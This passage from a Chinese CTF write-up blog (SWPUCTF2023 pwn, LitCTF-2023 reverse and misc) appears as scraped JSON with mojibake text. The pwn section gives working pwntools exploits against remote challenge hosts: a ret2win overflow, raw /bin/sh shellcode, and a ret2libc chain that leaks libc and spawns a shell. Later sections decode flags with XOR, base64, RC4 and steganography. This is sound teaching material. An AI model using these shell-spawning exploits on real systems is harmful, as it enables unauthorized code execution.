28469)\rio.sendline(b\u0026#39;1\u0026#39;)\rio.sendline(b\u0026#39;1\u0026#39;)\rio.sendline(b\u0026#39;-100\u0026#39;)\rio.sendline(b\u0026#39;2\u0026#39;)\rio.sendline(b\u0026#39;2\u0026#39;)\rio.sendline(b\u0026#39;1\u0026#39;)\rtarget=0x000000000040154C\rpayload=b\u0026#39;a\u0026#39;*(10+8)+p64(target)\rio.sendline(payload)\rio.interactive() æ‹¿åˆ°flag\nShellcode #\rchecksec\nç›´æ¥æŠŠshellcodeå‘è¿‡å»å°±è¡Œäº†\nfrom pwn import *\rcontext(os=\u0026#34;linux\u0026#34;,arch=\u0026#39;amd64\u0026#39;,log_level=\u0026#39;debug\u0026#39;)\rio=remote(\u0026#39;node4.anna.nssctf.cn\u0026#39;, 28409)\rpayload=b\u0026#34;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05\u0026#34;\rio.sendline(payload)\rio.interactive() ezlibc #\ræ‰¾äº†å¥½ä¹…æ‰¾åˆ°ä¸€ç¯‡è®²ret2libcç›¸å¯¹æ¸…æ™°çš„æ–‡ç« \nPwnå…¥é—¨ç¬”è®°ï¼ˆä¸‰ï¼‰å‡½æ•°ç»†èŠ‚_pwn p64-CSDNåšå®¢ checksecï¼Œé™„ä»¶ä¸­ç»™äº†libcæ–‡ä»¶\nè¿›å…¥IDAæŸ¥çœ‹ä¼ªä»£ç \næŸ¥çœ‹ä¸å‡ºæ¥å…·ä½“å¤šå°‘ä¸ªå¡«å……ä½\nä½¿ç”¨pwndbgå¯¹é™„ä»¶è¿›è¡Œè°ƒè¯•ï¼Œå¯ä»¥çœ‹åˆ°æœ‰æŠ¥é”™åœ°å€ï¼Œä½¿ç”¨cyclicè¿›è¡Œè®¡ç®—ï¼Œå¾—åˆ°å¡«å……ä½æ˜¯20\nç”±äºé¢˜ç›®å·²ç»ç»™å‡ºäº†lib.soæ–‡ä»¶ï¼Œå› æ­¤æ— éœ€è®¡ç®—åç§»é‡\nè¿™é‡Œå†™ä»£ç å°±è¯¦ç»†ä¸€ç‚¹\né¦–å…ˆæ˜¯å¼•ç”¨æºæ–‡ä»¶\nelf = ELF(\u0026#39;./ezlibc\u0026#39;) #åŠ è½½æºæ–‡ä»¶\rlibc = ELF(\u0026#39;./libc-2.31.so\u0026#39;) #åŠ è½½libc.so ç„¶åè¿›è¡Œæ•°æ®å‘é€\nio.sendline(b\u0026#39;a\u0026#39;*20+p32(write_plt_addr)+p32(0x80491B6)+p32(1)+p32(write_got_addr)+p32(4)) å¯¹ä¸Šé¢è¿™ä¸ªpaylaodçš„è§£é‡Šï¼š20ä¸ªaæº¢å‡ºåè¿›å…¥writeå‡½æ•°ï¼Œ0x80491B6æ˜¯dofuncå‡½æ•°çš„åœ°å€ï¼Œä¹Ÿæ˜¯writeå‡½æ•°çš„è¿”å›åœ°å€ã€‚åé¢ä¸‰ä¸ªå‚æ•°å¯¹åº”çš„æ˜¯ï¼š1ä¸ºwriteçš„\u0026quot;å†™æ¨¡å¼\u0026quot;ï¼Œelf.got.writeæ˜¯æ‰“å°å­—ç¬¦ä¸²çš„åœ°å€ï¼Œ4æ˜¯æŒ‡å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚\nä¸ºä»€ä¹ˆwriteå‡½æ•°çš„åœ°å€è¦è¿”å›åˆ°dofuncçš„å¼€å§‹å‘¢ï¼Ÿå› ä¸ºè¦åˆ¶é€ ä¸€ä¸ªå¾ªç¯ï¼Œç¬¬ä¸€æ¬¡dofuncçš„æ—¶å€™æ˜¯ä¸çŸ¥é“writeå‡½æ•°çš„åœ°å€çš„ï¼Œå°†å…¶æ‰“å°å‡ºæ¥åå†è¿›è¡Œdofuncå‡½æ•°æ“ä½œï¼Œå°±å¯ä»¥åˆ©ç”¨è®¡ç®—åç§»é‡æ¥è¿›è¡Œæ„é€ payloadã€‚ï¼ˆå®é™…ä¸Šå¹¶ä¸ä¸€å®šè¦æ˜¯dofuncï¼Œåªéœ€è¦åœ¨æº¢å‡ºç‚¹å‰é¢å°±è¡Œï¼‰\nå¯ä»¥çœ‹åˆ°dofuncçš„åœ°å€å°±åœ¨0x80491B6\nç®€å•æµ‹è¯•ä¸€ä¸‹æ‹¿åˆ°writeçš„åœ°å€çš„è¿‡ç¨‹\nfrom pwn import *context(arch=\u0026#39;i386\u0026#39;, os=\u0026#39;linux\u0026#39;,log_level=\u0026#34;debug\u0026#34;)io=process(\u0026#39;./ezlibc\u0026#39;)elf=ELF(\u0026#39;./ezlibc\u0026#39;)libc=ELF(\u0026#39;./libc-2.31.so\u0026#39;)write_plt_addr = elf.plt[\u0026#34;write\u0026#34;]write_got_addr = elf.got[\u0026#34;write\u0026#34;]main_addr = 0x80491B6io.recvuntil(b\u0026#34;Hello, there is a ez libc test!!!input:\u0026#34;)io.sendline(b\u0026#39;a\u0026#39;*20+p32(write_plt_addr)+p32(0x80491B6)+p32(1)+p32(write_got_addr)+p32(4))io.recvuntil(b\u0026#39;byebye\u0026#39;)write_addr=u32(io.recv(4))print(hex(write_addr))io.interactive() å¯ä»¥çœ‹åˆ°æˆåŠŸè·å–åˆ°writeçš„åœ°å€ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¿›è¡Œè®¡ç®—åç§»é‡\nbase_addr = write_addr - write_offset\rsystem_addr = base_addr + system_offset\rbinsh_addr = base_addr + binsh_offset ç„¶åçš„è¯å°±æ˜¯è¿›è¡Œå‘é€payload\nio.sendline(b\u0026#39;a\u0026#39;*20+p32(system_addr)+p32(1)+p32(binsh_addr))= æ ¼å¼æ˜¯å’Œæœ€å¼€å§‹çš„ä¸€æ ·ï¼Œè¿™é‡Œ1æ˜¯systemå‡½æ•°çš„è¿”å›åœ°å€ï¼Œä¸é‡è¦ï¼Œbinshæ˜¯å‡½æ•°çš„å‚æ•°\nå®Œæ•´çš„ä»£ç å¦‚ä¸‹\nfrom pwn import *\rcontext(arch=\u0026#39;i386\u0026#39;, os=\u0026#39;linux\u0026#39;,log_level=\u0026#34;debug\u0026#34;)\r#io=process(\u0026#39;./ezlibc\u0026#39;)\rio=remote(\u0026#39;node4.anna.nssctf.cn\u0026#39;, 28566)\relf=ELF(\u0026#39;./ezlibc\u0026#39;)\rlibc=ELF(\u0026#39;./libc-2.31.so\u0026#39;)\rwrite_plt_addr = elf.plt[\u0026#34;write\u0026#34;]\rwrite_got_addr = elf.got[\u0026#34;write\u0026#34;]\rmain_addr = 0x80491B6\rio.recvuntil(b\u0026#34;Hello, there is a ez libc test!!!input:\u0026#34;)\rio.sendline(b\u0026#39;a\u0026#39;*20+p32(write_plt_addr)+p32(0x80491B6)+p32(1)+p32(write_got_addr)+p32(4))\rio.recvuntil(b\u0026#39;byebye\u0026#39;)\rwrite_addr=u32(io.recv(4))\rsystem_offset = libc.symbols[\u0026#39;system\u0026#39;]\rbinsh_offset = next(libc.search(\u0026#39;/bin/sh\u0026#39;))\rwrite_offset = libc.symbols[\u0026#39;write\u0026#39;]\rbase_addr = write_addr - write_offset\rsystem_addr = base_addr + system_offset\rbinsh_addr = base_addr + binsh_offset\rio.recvuntil(b\u0026#34;Hello, there is a ez libc test!!!input:\u0026#34;)\rio.sendline(b\u0026#39;a\u0026#39;*20+p32(system_addr)+p32(1)+p32(binsh_addr))\rio.interactive() æœ¬é¢˜æ˜¯ç»™å‡ºäº†libc.soæ–‡ä»¶å°±å¯ä»¥ç›´æ¥ä»é‡Œé¢æå–ï¼Œå¦‚æœæ²¡æœ‰çš„è¯éœ€è¦ä½¿ç”¨LibcSearcheræ¥è¿›è¡Œæœç´¢\nç¥å¥‡çš„strlen #\rchecksecæŸ¥çœ‹ï¼Œé¢˜ç›®æä¾›äº†libcsoæ–‡ä»¶\næŸ¥çœ‹IDAä¼ªä»£ç ï¼Œåº”è¯¥æ˜¯ret2libcçš„64ä½putç±»å‹é¢˜ç›®\nè¿™é‡Œçš„strlenå‡½æ•°é‡åˆ°\u0026rsquo;\\x00\u0026rsquo;è¿™ä¸ªç»ˆæ­¢ç¬¦çš„æ—¶å€™ä¼šåœæ­¢è®¡æ•°ï¼Œä»è€Œç»•è¿‡é•¿åº¦åˆ¤æ–­\nPWN PWN PWN !!! æŠ€å·§ (1)_pwnä¼ å‚å’Œæ¥æ”¶é—®é¢˜-CSDNåšå®¢ å¾…ç»­ã€‚ã€‚ã€‚ã€‚\n","date":"2024-11-24","externalUrl":null,"permalink":"/posts/2024/11/swpuctf2023-pwn/","section":"Posts","summary":"","title":"SWPUCTF2023-Pwn","type":"posts"},{"content":"","date":"2024-11-23","externalUrl":null,"permalink":"/tags/litctf/","section":"Tags","summary":"","title":"Litctf","type":"tags"},{"content":"\rä¸–ç•Œä¸Šæœ€æ£’çš„ç¨‹åºå‘˜ #\rShift+F12ï¼Œåœ¨å…¨å±€å­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾åˆ°flag\nez_XOR #\rä½¿ç”¨32ä½IDAæ‰“å¼€ï¼ŒF5æŸ¥çœ‹ä¼ªä»£ç \nå¯ä»¥çœ‹åˆ°å­˜åœ¨å­—ç¬¦ä¸²è¾“å…¥åè¿›è¡Œå¼‚æˆ–ï¼Œå¼‚æˆ–æ˜¯å¯é€†æ€§çš„\nè·Ÿè¿›æŸ¥çœ‹XORå‡½æ•°çš„å†…å®¹ï¼Œå¾ˆæ˜æ˜¾æ˜¯æ¯ä¸ªå­—ç¬¦å’Œ9è¿›è¡Œå¼‚æˆ–\ns=\u0026#39;E`}J]OrQF[V8zV:hzpV}fVF[t\u0026#39;\rfor i in s:\rprint(chr(ord(i)^9),end=\u0026#39;\u0026#39;)\r#LitCTF{XOR_1s_3asy_to_OR} enbase64 #\rF5æŸ¥çœ‹ä¼ªä»£ç \nå¯ä»¥çœ‹åˆ°è¾“å…¥å­—ç¬¦ä¸²é•¿åº¦æ˜¯33ï¼Œç„¶åè¿›å…¥Base64åŠ å¯†ï¼Œæœ€åå†è¿›è¡Œcheck\nç”±äºSourceä¸æ˜¯æ ‡å‡†çš„Base64è¡¨ï¼Œè¿™ä¸ªå¯ä»¥åœ¨Base64å‡½æ•°é‡Œçœ‹åˆ°æœ‰ä¸ªBasechangeï¼Œå¯¹è¡¨åšäº†ä¿®æ”¹\nå¯ä»¥è®©AIè·‘ä¸€ä¸ªè„šæœ¬ï¼Œæ³¨æ„äº†è¿™é‡Œæœ‰ä¸€ä½æ˜¯æ²¡æœ‰èµ‹å€¼çš„ï¼Œä¹Ÿå°±æ˜¯v3[33]\nv3 = [\r16, 34, 56, 7, 46, 2, 10, 44, 20, 41,\r59, 31, 51, 60, 61, 26, 5, 40, 21, 38,\r4, 54, 52, 47, 3, 11, 58, 48, 32, 15,\r49, 14, 37, 0, 55, 53, 24, 35, 18, 25,\r33, 43, 50, 39, 12, 19, 13, 42, 9, 17,\r28, 30, 23, 36, 1, 22, 57, 63, 8, 27,\r6, 62, 45, 29\r]\rsource = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#34;\rfor i in range(48):\r# åˆ›å»ºä¸€ä¸ªä¸´æ—¶åˆ—è¡¨ï¼Œç”¨äºå­˜å‚¨ç½®æ¢åçš„å­—ç¬¦\rtemp = [\u0026#39;\u0026#39;] * 64\r# éå†ç´¢å¼•æ•°ç»„ï¼ŒæŒ‰ç…§ç´¢å¼•äº¤æ¢å­—ç¬¦\rfor j in range(64):\rtemp[j] = source[v3[j]]\r# å°†ä¸´æ—¶åˆ—è¡¨èµ‹å€¼ç»™åŸå§‹å­—ç¬¦ä¸²\rsource = \u0026#39;\u0026#39;.join(temp) # ç›´æ¥å°†åˆ—è¡¨è½¬æ¢ä¸ºå­—ç¬¦ä¸²\rprint(source)\r#gJ1BRjQie/FIWhEslq7GxbnL26M4+HXUtcpmVTKaydOP38of5v90ZSwrkYzCAuND è¿›å…¥èµ›æ’­å¨å¸ˆï¼Œæ¢è¡¨å°±èƒ½å¾—åˆ°flag\nsnake #\ré™„ä»¶ç»™çš„æ˜¯ä¸€ä¸ªpycæ–‡ä»¶ï¼Œä¸èƒ½ç”¨IDAæ¥è¿›è¡Œåç¼–è¯‘\npycdcé…ç½®å’Œä½¿ç”¨-CSDNåšå®¢ Python ä»€ä¹ˆæ˜¯Bad Magic Numberé”™è¯¯|æå®¢ç¬”è®° (deepinout.com) åœ¨Pythonä¸­ï¼Œæ¯ä¸ª.pycæ–‡ä»¶ï¼ˆå³Pythonå­—èŠ‚ç æ–‡ä»¶ï¼‰éƒ½åŒ…å«ä¸€ä¸ªé­”æœ¯æ•°å­—ï¼ˆMagic Numberï¼‰æ¥è¯†åˆ«ç‰ˆæœ¬å…¼å®¹æ€§ã€‚å½“æˆ‘ä»¬å°è¯•åŠ è½½ä¸€ä¸ª.pycæ–‡ä»¶æ—¶ï¼ŒPythonä¼šæ£€æŸ¥æ–‡ä»¶ä¸­çš„é­”æœ¯æ•°å­—æ˜¯å¦ä¸å½“å‰\nè§£é‡Šå™¨ç‰ˆæœ¬åŒ¹é…ã€‚å¦‚æœä¸åŒ¹é…ï¼Œå°±ä¼šå¼•å‘Bad Magic Numberé”™è¯¯ã€‚\næŸ¥çœ‹æ–‡ä»¶å¤´å‘ç°ä»€ä¹ˆéƒ½æ²¡æœ‰\nç»“åˆæ–‡ä»¶åçš„37ï¼ŒçŒœæµ‹pythonç‰ˆæœ¬åº”è¯¥æ˜¯3.7\nPythoné€†å‘å…¨ç‰ˆæœ¬MagicNumberè¡¨_python3.11.4 magicnumber-CSDNåšå®¢ åç¼–è¯‘åå¯ä»¥çœ‹åˆ°ï¼Œåˆ†æ•°è¶…è¿‡1000å°±æœ‰flag\nç›´æ¥å¤åˆ¶ä»–çš„ä»£ç ä¼šä¹±ç ï¼ŒæŒ‡å®šç¼–ç ä¹Ÿæ²¡ç”¨\nç»†çœ‹ä»–çš„èµ‹å€¼é€»è¾‘æ˜¯æœ‰é—®é¢˜çš„ï¼Œåå€¼åœ¨ä½¿ç”¨å‰å€¼çš„æ—¶å€™ï¼Œå‰å€¼æ˜¯å·²ç»è¢«ä¿®æ”¹è¿‡çš„ï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´ä¸å‡†ç¡®\nflag = [\r30, 196, 52, 252, 49, 220, 7, 243,\r3, 241, 24, 224, 40, 230, 25, 251,\r28, 233, 40, 237, 4, 225, 4, 215,\r40, 231, 22, 237, 14, 251, 10, 169\r]\rfor i in range(0, len(flag), 2):\rtemp=flag[i]\rflag[i] = flag[i + 1] ^ 136\rflag[i + 1] = temp ^ 119\r# å°†ç»“æœè½¬æ¢ä¸ºå­—èŠ‚å¹¶è§£ç ä¸ºå­—ç¬¦ä¸²\rdecoded_flag = bytes(flag).decode(errors=\u0026#39;ignore\u0026#39;)\rprint(decoded_flag)\r#LitCTF{python_snake_is_so_easy!} ç¨‹åºå’Œäººæœ‰ä¸€ä¸ªèƒ½è·‘å°±è¡Œäº† #\rè¿™ä¸ªsub_4015A0å‡½æ•°å¯ä»¥è®©AIè¿›è¡Œåˆ†æï¼Œç¬¦åˆRC4åŠ å¯†çš„ç‰¹å¾\nåœ¨åº•éƒ¨ä»£ç é‡Œå­˜åœ¨é€»è¾‘é”™è¯¯ï¼Œæ— è®ºæ˜¯å¦æ¯”è¾ƒæˆåŠŸï¼Œéƒ½ä¼šè¾“å‡ºU are right?\nå¯ä»¥æ‰“ä¸ªæ–­ç‚¹çœ‹çœ‹è¿‡ç¨‹\nä½¿ç”¨windowsçš„debugger\nè¿™é‡Œæ˜¯ä¸€äº›IDAçš„ä½¿ç”¨æŠ€å·§\nå¤šæ¬¡æ­¥è¿‡ä¹‹åå‘ç°ä¸€æ®µå­—èŠ‚ï¼Œå¯èƒ½æ˜¯å¯†æ–‡\n.text:00475BBA mov byte ptr [esp+83h], 8Dh\r.text:00475BC2 mov byte ptr [esp+84h], 6Ch ; \u0026#39;l\u0026#39;\r.text:00475BCA mov byte ptr [esp+85h], 85h\r.text:00475BD2 mov byte ptr [esp+86h], 76h ; \u0026#39;v\u0026#39;\r.text:00475BDA mov byte ptr [esp+87h], 32h ; \u0026#39;2\u0026#39;\r.text:00475BE2 mov byte ptr [esp+88h], 72h ; \u0026#39;r\u0026#39;\r.text:00475BEA mov byte ptr [esp+89h], 0B7h\r.text:00475BF2 mov byte ptr [esp+8Ah], 43h ; \u0026#39;C\u0026#39;\r.text:00475BFA mov byte ptr [esp+8Bh], 85h\r.text:00475C02 mov byte ptr [esp+8Ch], 7Bh ; \u0026#39;{\u0026#39;\r.text:00475C0A mov byte ptr [esp+8Dh], 85h\r.text:00475C12 mov byte ptr [esp+8Eh], 0DEh\r.text:00475C1A mov byte ptr [esp+8Fh], 0C1h\r.text:00475C22 mov byte ptr [esp+90h], 0FBh\r.text:00475C2A mov byte ptr [esp+91h], 2Eh ; \u0026#39;.\u0026#39;\r.text:00475C32 mov byte ptr [esp+92h], 64h ; \u0026#39;d\u0026#39;\r.text:00475C3A mov byte ptr [esp+93h], 7\r.text:00475C42 mov byte ptr [esp+94h], 0C8h\r.text:00475C4A mov byte ptr [esp+95h], 5Fh ; \u0026#39;_\u0026#39;\r.text:00475C52 mov byte ptr [esp+96h], 9Ah\r.text:00475C5A mov byte ptr [esp+97h], 35h ; \u0026#39;5\u0026#39;\r.text:00475C62 mov byte ptr [esp+98h], 18h\r.text:00475C6A mov byte ptr [esp+99h], 0ADh\r.text:00475C72 mov byte ptr [esp+9Ah], 0B5h\r.text:00475C7A mov byte ptr [esp+9Bh], 15h\r.text:00475C82 mov byte ptr [esp+9Ch], 92h\r.text:00475C8A mov byte ptr [esp+9Dh], 0BEh\r.text:00475C92 mov byte ptr [esp+9Eh], 1Bh\r.text:00475C9A mov byte ptr [esp+9Fh], 88h\r.text:00475CA2 call memcmp ç„¶åè®©AIè·‘ä¸€ä¸ªè„šæœ¬å³å¯\nfrom Crypto.Cipher import ARC4\r# å¯†é’¥å’Œå¯†æ–‡\rkey = b\u0026#39;litctf\u0026#39;\rciphertext = bytes([0x8D, 0x6C, 0x85, 0x76, 0x32, 0x72, 0xB7, 0x43, 0x85, 0x7B,\r0x85, 0xDE, 0xC1, 0xFB, 0x2E, 0x64, 0x07, 0xC8, 0x5F,\r0x9A, 0x35, 0x18, 0xAD, 0xB5, 0x15, 0x92, 0xBE, 0x1B, 0x88])\r# åˆ›å»ºRC4è§£å¯†å™¨\rcipher = ARC4.new(key)\r# è§£å¯†\rplaintext = cipher.decrypt(ciphertext)\r# è¾“å‡ºç»“æœ\rprint(plaintext.decode(\u0026#39;utf-8\u0026#39;, errors=\u0026#39;ignore\u0026#39;))\r#LitCTF{welcome_to_the_litctf} debase64 #\ré¢˜ç›®æ˜¯å’ŒBase64ç›¸å…³çš„\né¦–å…ˆæ³¨æ„åˆ°v15çš„é•¿åº¦å¿…é¡»æ˜¯20\nsub_401520è¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½ç±»ä¼¼äºå¯¹v13è¿›è¡Œè§£å¯†ï¼Œç„¶åç»“æœå­˜åˆ°v4ä¸­\næœ€åå¯¹æ¯”v4çš„å†…å®¹æ˜¯å¦æ­£ç¡®ï¼Œè¿™é‡Œå¯ä»¥çœ‹åˆ°æ¯”è¾ƒçš„æ­¥é•¿æ˜¯2ï¼Œè€Œé‚£å‡ ä¸ªæ•°å­—å¯ä»¥ä½¿ç”¨åå…­è¿›åˆ¶è¡¨ç¤ºï¼Œä»è€Œåˆ†æˆä¸¤ä¸ªéƒ¨åˆ†\nå¯¹v6æ‰“ä¸ªæ–­ç‚¹è¿›è¡Œè°ƒè¯•\nå¯ä»¥æ³¨æ„åˆ°18EDæ‰æ˜¯6381ï¼Œæ‰€ä»¥åå…­è¿›åˆ¶çš„ä¸¤ä¸ªå­—èŠ‚éœ€è¦ç½®æ¢\nimport base64\rdata=[0x46, 0xed, 0x18, 0x96, 0x56, 0x9E, 0xd2, 0x72, 0xb2, 0xb3, 0x80, 0x70]\rbytes_encoded = bytes(data)\rdecoded_bytes = base64.b64encode(bytes_encoded).decode(\u0026#39;utf-8\u0026#39;)\rprint(decoded_bytes)\r#Ru0Yllae0nKys4Bw ä½†æ˜¯åŠ å¯†ç»“æœéœ€è¦æ¯å››ä¸ªå­—èŠ‚è¿›è¡Œé€†åºï¼Œçœ‹åˆ«äººçš„æ–‡ç« ä¼¼ä¹æ˜¯ä¼ªä»£ç ä¸­çš„Base64åŠ å¯†è¿‡ç¨‹å¹¶ä¸æ ‡å‡†ï¼Œä¹Ÿæˆ–è®¸æ˜¯å› ä¸ºç¨‹åºçš„å¤§ç«¯åºå­˜å‚¨ã€‚\næ ¹æ®é¢˜ç›®æè¿°è¿›è¡ŒMD5çˆ†ç ´ï¼Œå¾—åˆ°flag\nfrom hashlib import md5\rimport string\rs = \u0026#34;Y0uReallyKn0wB4s\u0026#34;\rfor i in string.printable:\rtest = s + i + \u0026#34;===\u0026#34;\rif md5(test.encode()).hexdigest() == \u0026#34;5a3ebb487ad0046e52db00570339aace\u0026#34;:\rprint(test)\rbreak\r#NSSCTF{Y0uReallyKn0wB4s3===} For Aiur #\rä½¿ç”¨64ä½IDAè¿›è¡Œåç¼–è¯‘ï¼Œèƒ½å¤Ÿçœ‹å‡ºä¼¼ä¹æ˜¯ç”±pyinstallerè¿›è¡Œæ‰“åŒ…çš„EXEæ–‡ä»¶\nåç¼–è¯‘å·¥å…·\nextremecoders-re/pyinstxtractor: PyInstaller Extractor (github.com) å¯¹Probee.pycè¿›è¡Œåç¼–è¯‘ï¼Œä»chä¸­å¼•å…¥äº†checkå‡½æ•°\nè¿™é‡Œæœ‰ä¸ªæ³¨æ„ç‚¹ï¼Œéœ€è¦ä½¿ç”¨python3.8ç‰ˆæœ¬ï¼Œä¸ç„¶ä¼šæ‰¾ä¸åˆ°è¿™ä¸ªchæ–‡ä»¶\nenc = [\r98, 77, 94, 91, 92, 107, 125, 66, 87, 70,\r113, 92, 83, 70, 85, 81, 19, 21, 109, 99,\r87, 107, 127, 65, 65, 64, 109, 87, 93, 90,\r65, 64, 64, 65, 81, 3, 109, 85, 86, 80,\r91, 64, 91, 91, 92, 0, 94, 107, 66, 77,\r94, 91, 92, 71\r]\rdef check(num):\rflag = \u0026#39;LitCTF{\u0026#39;\rif num % 2 == 0 and num % 4 == 0 and num % 6 == 0 and num % 8 == 0 and num % 12 == 0 and num % 13 == 11:\rk = str(num)\rfor i in range(len(enc)):\rflag += chr(ord(k[i % len(k)]) ^ enc[i])\rflag += \u0026#39;}\u0026#39;\rprint(flag)\rcheck(24)\r#LitCTF{Pylon_OverCharge!!_We_Must_construc7_addition4l_pylons} ","date":"2024-11-23","externalUrl":null,"permalink":"/posts/2024/11/litctf-2023-reverse/","section":"Posts","summary":"","title":"LitCTF-2023-Reverse","type":"posts"},{"content":"","date":"2024-11-23","externalUrl":null,"permalink":"/tags/reverse/","section":"Tags","summary":"","title":"Reverse","type":"tags"},{"content":"","date":"2024-11-21","externalUrl":null,"permalink":"/tags/misc/","section":"Tags","summary":"","title":"Misc","type":"tags"},{"content":"\rå°‘å¹´çš„ctfå¥‡é‡ #\rè€ƒç‚¹ï¼šLSBéšå†™ã€å›¾ç‰‡å®½é«˜ä¿®æ”¹\né¢˜ç›®æè¿°ï¼šä½ è¯´äº†å›¾ç‰‡é‡Œçš„ä¸€å¥è¯ï¼Œè€å©†éœ²å‡ºäº†è¿™ä¸ªè¡¨æƒ…ã€‚ LSBéšå†™åŸç† #\rLSBå³ä¸ºæœ€ä½æœ‰æ•ˆä½ï¼Œå›¾ç‰‡ä¸­çš„å›¾åƒåƒç´ ä¸€èˆ¬æ˜¯ç”±RGBä¸‰åŸè‰²ï¼ˆçº¢ç»¿è“ï¼‰ç»„æˆ\næ¯ä¸€ç§é¢œè‰²å ç”¨8ä½ï¼Œå–å€¼èŒƒå›´ä¸º0x00~0xFFï¼Œå³æœ‰256ç§é¢œè‰²ï¼Œä¸€å…±åŒ…å«äº†256çš„3æ¬¡æ–¹çš„é¢œè‰²\nè€Œäººçš„çœ¼ç›èƒ½å¤ŸåŒºåˆ†çš„é¢œè‰²æ˜¯æœ‰é™çš„ï¼ŒLSBéšå†™å°±æ˜¯ä¿®æ”¹RGBé¢œè‰²åˆ†é‡çš„æœ€ä½äºŒè¿›åˆ¶ä½ä¹Ÿå°±æ˜¯æœ€ä½æœ‰æ•ˆä½\nStegSolve #\rè¿™é‡Œä½¿ç”¨çš„æ˜¯StegSolveå·¥å…·ï¼Œè½½å…¥å›¾ç‰‡é€‰ç”¨æ•°æ®æå–åˆ†æ\nå¾—åˆ°éƒ¨åˆ†flagï¼šNSSCTF{lao_po å®½é«˜è°ƒæ•´ #\rè¿™é‡Œä½¿ç”¨éšæ³¢é€æµå·¥å…·\nå¯ä»¥çœ‹åˆ°é«˜åº¦å’Œç¼–ç é‡Œçš„ä¸ä¸€è‡´ï¼Œéœ€è¦è°ƒæ•´\næ‰“å¼€winhexæˆ–è€…010editoréƒ½è¡Œï¼Œæˆ‘è¿™é‡Œç”¨çš„æ˜¯winhex\nå¦‚å›¾ä¿®æ”¹é«˜åº¦ä¸º01B7ï¼Œä¹Ÿå°±æ˜¯439\nä¿å­˜ä¹‹åå†æ‰“å¼€å›¾ç‰‡\nååŠæ®µï¼š_s0_cute!} ä¸€æ®µæœ‰è§„å¾‹çš„å£°éŸ³ #\rç­”æ¡ˆæ ¼å¼ä¸ºä¸€ä¸²èƒ½è¿æˆè¯çš„ç®€å•è‹±è¯­ä¸»è°“å®¾å¥å­è¯·æ‰€æœ‰å­—æ¯å…¨éƒ¨å¤§å†™,ç©ºæ ¼ç”¨_ä»£æ›¿ååŒ…è£¹NSSCTF{}(æç¤ºï¼šä¸æ­¢ä¸€ç§è§£æ³•)\nä¸€ä¸ªéŸ³é¢‘é‡Œå…¨æ˜¯é‡å¤æ€§çš„ä¸¤ç§å£°éŸ³ï¼Œä¸éš¾æƒ³è±¡åˆ°æ˜¯æ‘©æ–¯å¯†ç çš„é•¿çŸ­æ€§\nãƒ»ãƒ»ãƒ»â€”ãƒ»ãƒ»â€” â€” â€”ãƒ»ãƒ»ãƒ»â€”ãƒ»â€”ãƒ»â€” â€” â€” â€” â€” ãƒ»ãƒ»â€” æç¤ºè¯´èƒ½ç»„æˆä¸€å¥ç®€å•çš„è‹±è¯­ä¸»è°“å®¾å¥å­\nç»è¿‡å°è¯•å¾—åˆ°æ˜æ–‡\nãƒ»ãƒ»/ãƒ»â€”ãƒ»ãƒ»/â€” â€” â€”/ãƒ»ãƒ»ãƒ»â€”/ãƒ»/â€”ãƒ»â€” â€” /â€” â€” â€”/ ãƒ»ãƒ»â€”/\rI LOVE YOU ez-QR #\rä»é¢˜ç›®æ¥çœ‹æ˜¯ä¸€é“äºŒç»´ç çš„é¢˜ç›®\nç»™çš„é™„ä»¶æ˜¯ä¸€ä¸ªGIFåŠ¨å›¾ï¼Œä¼šå¾ªç¯å±•ç¤ºè¿™ä¸ªäºŒç»´ç çš„æ¯ä¸ªéƒ¨åˆ†\nåœ¨çº¿GIFå›¾ç‰‡å¸§æ‹†åˆ†å·¥å…· - UUåœ¨çº¿å·¥å…· (uutool.cn) å°†å…¶æ‹†åˆ†å¾—åˆ°ä¹ä¸ªéƒ¨åˆ†\nå¼„ä¸€ä¸ªç”»å¸ƒè¿›å»æ‹¼æ¥å°±å¥½äº†ï¼Œæ ¹æ®è¾¹è§’çš„ç©ºéš™æ¥åˆ¤æ–­\nåœ¨çº¿ç”»å›¾è½¯ä»¶_å…è´¹ç”»å›¾å·¥å…· - Canvaå¯ç”» flagï¼šNSSCTF{123fgh789okm} æ€ä¹ˆå…¨æ˜¯01ï¼Œæˆ‘flagå‘¢ #\ræˆ‘flagå‘¢ï¼Ÿæˆ‘ä¸åˆ°å•Šï¼Œæ»´æ»´ç­”æ»´å“’å“’å“’ï¼ˆæç¤ºï¼šæƒ³æƒ³æ–‡ä»¶çš„æœ¬è´¨æ˜¯ä»€ä¹ˆï¼‰\n1111111111110000111001111111111111000001111110011111111111111000000000110000001110011000011100110001100110011000000000111000000000110000001110011000011100110001100110011000000000111001111110110011000001100001110000111110000000011011111100111001111110110011000001100001110000111110000000011011111100111001111110110000111110000110011111001101111110011011111100111001111110110000111110000110011111001101111110011011111100111001111110110011001110000110010011111111111110011011111100111001111110110011001110000110010011111111111110011011111100111000000000110011001000011110011111110000000000011000000000111111111111110011001001100110010011001101100110011111111111111111111111110011001001100110010011001101100110011111111111110000000000000000110001111000001111000010000000000000000000000000000000000000110001111000001111000010000000000000000000000110000110110011000110000001101100110011100111100111001100000110000110110011000110000001101100110011100111100111001100000110000111000011110111111001110011001100011001100100001100000110000111000011110111111001110011001100011001100100001100001110000110111100000111111000001100000001111000000000001100001000011000000000000000011001101111001111111001100100000000001000011000000000000000011001101111001111111001100100000000000000011001110011001110011001110011111111100000011111111100110000011001110011001110011001110011111111100000011111111100110110011000001111001111100110000000110000011111100000001100110110011000001111001111100110000000110000011111100000001100111000000111110011000111100000001100110000011000000011001111001000000111110011000111100000001100110000011000000011001111001110000000001100111001111110010000111111100001100111110000111110000000001100111001111110010000111111100001100111110000111000000111110011111000000000001111000011100001111111110000001111100001001100001110000111110011001100011110000100001100001111100001001100001110000111110011001100011110000100001100000001111000111100001110000001111100000010011000000100001100000001111000111100001110000001111100000010011000000100001100001110011110001100000000011110010011001110000111100011000011001110011110001100000000011110010011001110000111100011000011000110000110111100111111100111100000110011100110011011001111110110000110111100111111100111100000110011100110011011001111111110011110000011111000011111101111111101111001100100001111110001111111111111000111100000